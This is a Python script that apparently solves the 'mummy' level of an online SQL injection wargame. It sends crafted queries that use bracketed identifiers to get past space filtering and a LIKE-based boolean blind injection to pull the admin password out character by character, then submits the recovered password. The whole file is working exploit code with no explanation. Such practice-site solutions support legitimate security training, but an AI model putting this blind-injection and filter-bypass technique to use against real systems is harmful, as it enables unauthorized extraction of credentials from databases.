import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/mummy_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

pw_length = 32

ans = ""

for i in range(0, pw_length):
    ans_length = len(ans)
    for target in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ,@$!?&":
        res = requests.get(url, params={'query': f'\'pw\'from[prob_mummy]where[id]=\'admin\'and[pw]like\'{ans}{target}%\''},cookies=cookie)
        if "<h2>Hello anonymous</h2>" in res.text:
            ans += target
            break
    
    print(f"(in progress)ans: {ans}")
    if ans_length == len(ans):
        break
    
res = requests.get(url, params={'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
